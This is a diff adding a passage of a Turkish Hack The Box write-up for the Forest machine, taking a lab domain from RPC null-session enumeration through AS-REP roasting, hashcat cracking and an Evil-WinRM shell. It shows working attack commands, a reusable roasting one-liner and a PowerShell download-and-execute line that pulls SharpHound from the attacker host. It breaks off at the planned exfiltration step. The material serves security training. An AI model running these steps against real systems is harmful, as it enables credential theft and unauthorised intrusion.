@@ -374,3 +374,320 @@ Failed to connect with SMB1 -- no workgroup available
 Kullanıcıları listelemek için RPC üzerinden kontrol etmeyi deneyebilirim. [BlackHills'in bu konuda](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/) iyi bir yazısı var. Yazının türkçelşetirilmiş hali --> [[BlackHills-T\|BlackHills-T]]
 
 Null auth ile bağlanacağım:
+
+```
+root@kali# rpcclient -U "" -N 10.10.10.161
+rpcclient $>
+```
+
+`Enumdomusers` ile kullanıcıların bir listesini alabilirim:
+
+```
+rpcclient $> enumdomusers              
+user:[Administrator] rid:[0x1f4]       
+user:[Guest] rid:[0x1f5]               
+user:[krbtgt] rid:[0x1f6]              
+user:[DefaultAccount] rid:[0x1f7]      
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]  
+user:[andy] rid:[0x47e]                
+user:[mark] rid:[0x47f]                
+user:[santi] rid:[0x480]
+```
+
+Grupları da listeleyebilirim:
+
+```
+rpcclient $> enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]          
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]            
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[Organization Management] rid:[0x450]
+group:[Recipient Management] rid:[0x451]                 
+group:[View-Only Organization Management] rid:[0x452]
+group:[Public Folder Management] rid:[0x453]
+group:[UM Management] rid:[0x454]
+group:[Help Desk] rid:[0x455]
+group:[Records Management] rid:[0x456]
+group:[Discovery Management] rid:[0x457]
+group:[Server Management] rid:[0x458]
+group:[Delegated Setup] rid:[0x459]
+group:[Hygiene Management] rid:[0x45a]
+group:[Compliance Management] rid:[0x45b]
+group:[Security Reader] rid:[0x45c]
+group:[Security Administrator] rid:[0x45d]
+group:[Exchange Servers] rid:[0x45e]
+group:[Exchange Trusted Subsystem] rid:[0x45f]
+group:[Managed Availability Servers] rid:[0x460]
+group:[Exchange Windows Permissions] rid:[0x461]
+group:[ExchangeLegacyInterop] rid:[0x462]
+group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
+group:[Service Accounts] rid:[0x47c]
+group:[Privileged IT Accounts] rid:[0x47d]
+group:[test] rid:[0x13ed]
+```
+
+Ayrıca bir grubun üyelerini de inceleyebilirim. Örneğin, **Domain Admins** grubunun bir üyesi var, RID 0x1f4:
+
+```
+rpcclient $> querygroup 0x200          
+        Group Name:     Domain Admins     
+        Description:    Designated administrators of the domain
+        Group Attribute:7              
+        Num Members:1                  
+rpcclient $> querygroupmem 0x200
+        rid:[0x1f4] attr:[0x7]
+```
+
+**`querygroupmem 0x200`**
+
+- Bu komut, belirtilen grubun üyelerini listeler.
+- **0x200**, üyeleri sorgulanan grubun RID'sidir.
+- Çıktıda her üyenin RID’si `(rid:[0x1f4])` ve bu üyeye atanan attribute'lar (**`attr:[0x7]`**) görüntülenir.
+
+İlk komutla grup hakkında genel bilgi alınır, ikinci komutla grubun hangi kullanıcı ya da hesaplara sahip olduğu öğrenilir. Bu, özellikle Active Directory ortamında yetkili hesapları belirlemek için kullanılır.
+
+```
+rpcclient $> queryuser 0x1f4            
+        User Name   :   Administrator
+        Full Name   :   Administrator
+        Home Drive  :   
+        Dir Drive   :      
+        Profile Path:      
+        Logon Script:
+        Description :   Built-in account for administering the computer/domain
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Mon, 07 Oct 2019 06:57:07 EDT
+        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
+        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
+        Password last set Time   :      Wed, 18 Sep 2019 13:09:08 EDT
+        Password can change Time :      Thu, 19 Sep 2019 13:09:08 EDT
+        Password must change Time:      Wed, 30 Oct 2019 13:09:08 EDT
+        unknown_2[0..31]...
+        user_rid :      0x1f4
+        group_rid:      0x201
+        acb_info :      0x00000010
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x00000031
+        padding1[0..7]...
+        logon_hrs[0..21]...
+```
+
+
+
+## Shell as svc-alfresco
+
+### AS-REP Roasting
+
+Daha önce hem **Active** hem de **Sizzle** senaryolarında **Kerberoasting** saldırısını ele almıştım. Genellikle, bu saldırı için domain üzerinde kimlik doğrulama yapacak bir hesaba ihtiyaç duyulur. Ancak, bir hesabın "Kerberos ön kimlik doğrulama gerektirme" (veya **UF_DONT_REQUIRE_PREAUTH** bayrağı) özelliği **true** olarak ayarlanmış olabilir. **AS-REP Roasting**, bu tür hesaplara yönelik bir Kerberos saldırısıdır.
+
+Yukarıdaki RPC sorgulamasından elde ettiğim hesapların bir listesine sahibim. **SM*** veya **HealthMailbox*** ile başlayan hesapları liste dışı tutarak işe başlayacağım.
+
+```
+root@kali# cat users
+Administrator
+andy
+lucinda
+mark
+santi
+sebastien
+svc-alfresco
+```
+
+
+Artık Impacket aracı GetNPUsers.py'yi kullanarak her kullanıcı için bir hash almaya çalışabilirim ve svc-alfresco hesabı için bir tane buldum:
+
+```
+root@kali# for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
+
+[*] Getting TGT for Administrator
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for andy
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for lucinda
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for mark
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for santi
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for sebastien
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f
+```
+
+---
+
+Bu kod, bir Python scripti olan **GetNPUsers.py** kullanarak **AS-REP Roasting** saldırısını gerçekleştirmek için kullanıcıların **Kerberos ön kimlik doğrulama gereksinimi** olup olmadığını kontrol eder. İşte kodun yaptığı işlemler madde madde:
+
+1. **`for user in $(cat users)`**
+    
+    - **`users`** dosyasındaki her bir kullanıcı adını tek tek alır ve döngüye sokar.
+    - Dosyanın her satırında bir kullanıcı adı bulunur.
+2. **`GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}`**
+    
+    - **GetNPUsers.py** aracı çalıştırılır ve belirtilen kullanıcı üzerinde işlem yapılır:
+        
+        - **`-no-pass`**: Kullanıcı şifresi gerekmeksizin işlem yapılacağını belirtir.
+        - **`-dc-ip 10.10.10.161`**: İşlem yapılacak **Domain Controller** (DC) IP adresini belirtir.
+        - **`htb/${user}`**: Kullanıcıyı **htb** domain'ine ait olarak hedefler.
+    - Bu araç, kullanıcının **Kerberos ön kimlik doğrulama gereksinimi** kapalıysa (UF_DONT_REQUIRE_PREAUTH bayrağı açık) bir **AS-REP** bileti almayı dener.
+        
+3. **`| grep -v Impacket`**
+    
+    - Çıktı, **grep** komutuyla filtrelenir.
+    - **`-v Impacket`**, **Impacket** modülüyle ilgili gereksiz bilgi veya hata mesajlarını filtreleyerek yalnızca önemli çıktının görüntülenmesini sağlar.
+4. **Tüm döngüyü çalıştırma:**
+    
+    - **`done`** ifadesi, döngünün tamamlanacağını belirtir.
+    - Kullanıcı listesindeki her kullanıcı için işlem yapılır ve uygun olanların **AS-REP** biletleri döndürülür.
+
+### **Amaç:**
+
+Bu kod, domain kullanıcıları arasından **Kerberos ön kimlik doğrulama gereksinimi** kapalı olanları tespit eder. Bu kullanıcılar için **AS-REP Roasting** saldırısı yapılabilir, yani biletler alınıp offline brute force ile şifreler çözülebilir.
+
+Cheat Sheet' inize eklemek isterseniz kodun ham hali : 
+
+```
+for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip <DomainController_IP> mydomain/${user} | grep -v Impacket; done
+```
+
+---
+
+
+### Crack Hash
+
+Şimdi hash'i kırmak için hashcat'i kullanabilirim:
+
+```
+root@kali# hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
+...[snip]...
+$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$
+5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004
+d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice
+...[snip]...
+```
+
+Not : Hashcat'ın **18200** modu, **Kerberos AS-REP** (Authentication Service Response) şifre çözme modudur. Bu mod, **AS-REP Roasting** saldırısı sonucu alınan Kerberos biletlerini şifre çözmek için kullanılır.
+
+Şifrenin “==s3rvice==” olduğunu görüyorum.
+
+
+### WinRM
+
+Bu kimlik bilgilerini Evil-WinRM ile deneyeceğim ve çalışıyor:
+
+```
+root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
+                                                         
+Info: Starting Evil-WinRM shell v1.7
+
+Info: Establishing connection to remote endpoint
+                                                         
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
+```
+
+Buradan user.txt dosyasını alabilirim:
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt e5e4e47a************************
+```
+
+
+
+## Privesc to Administrator
+
+### Enumeration
+
+#### SharpHound
+
+Shell'im ile BloodHound için veri toplamak üzere SharpHound'u çalıştıracağım. Makinemde Bloodhound'un bir kopyası var (yoksa git clone https://github.com/BloodHoundAD/BloodHound.git adresini kullanabilirsiniz). `Ingestors` dizininde bir Python web sunucusu başlatacağım ve ardından mevcut oturumuma yükleyeceğim:
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")
+```
+
+Now I’ll invoke it:
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+```
+
+Sonuç bir zip dosyasıdır:
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> dir
+
+    Directory: C:\Users\svc-alfresco\appdata\local\temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/18/2019   3:56 AM          12740 20191018035650_BloodHound.zip
+-a----       10/18/2019   3:56 AM           8978 Rk9SRVNU.bin   
+```
+
+---
+
+1. **SharpHound.ps1 dosyasının indirilmesi**:
+    
+    - İlk olarak, `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")` komutu ile SharpHound.ps1 dosyası indiriliyor. Bu komut, hedef sistemde PowerShell aracılığıyla bir web sunucusundan `SharpHound.ps1` dosyasını indirir ve çalıştırır.
+2. **Invoke-BloodHound ile çalıştırılması**:
+    
+    - Daha sonra `invoke-bloodhound` komutu ile SharpHound'u çalıştırıyor. Burada birkaç parametre bulunmaktadır:
+        - `-collectionmethod all`: Tüm koleksiyon yöntemlerini kullanarak (örneğin: kullanıcılar, gruplar, yetkilendirme ilişkileri) veri toplar.
+        - `-domain htb.local`: Hedef Active Directory alanı.
+        - `-ldapuser svc-alfresco`: LDAP kullanıcı adı.
+        - `-ldappass s3rvice`: LDAP şifresi.
+
+Bu iki komut arasındaki fark, biri SharpHound.ps1 dosyasını indirip çalıştırırken, diğeri topladığı verileri BloodHound'a aktarmak içindir. SharpHound, Active Directory (AD) yapılandırmalarını analiz eder ve daha sonra bu topladığı verileri BloodHound'a entegre eder. BloodHound, toplanan bu verileri görselleştirir ve güvenlik açıklarını ortaya çıkarır.
+
+---
+
+Sonuçları exfil etmek için smbserver.py kullanacağım. Benim kutumda:
+
+
+
